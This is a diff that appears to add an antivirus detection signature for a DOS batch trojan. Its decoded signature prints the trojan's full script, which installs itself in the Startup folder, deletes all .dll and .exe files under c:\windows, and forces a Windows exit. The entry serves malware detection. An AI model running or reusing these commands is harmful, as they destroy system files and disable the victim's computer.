@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36705
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off xcopy *.bat c:\windows\startm~1\progra~1\startup copy *.bat c:\windows\startm~1\progra~1\startup cd.. cd.. cd.. cd.. cd.. c: cd c:\windows del *.dll cd.. cd.. c: cd c:\windows del *.exe cd.. cls echo germanme's bvm 2.0 - killing ya ! pause c:\windows\rundll32.exe user,exitwindowsexec cls end exit 
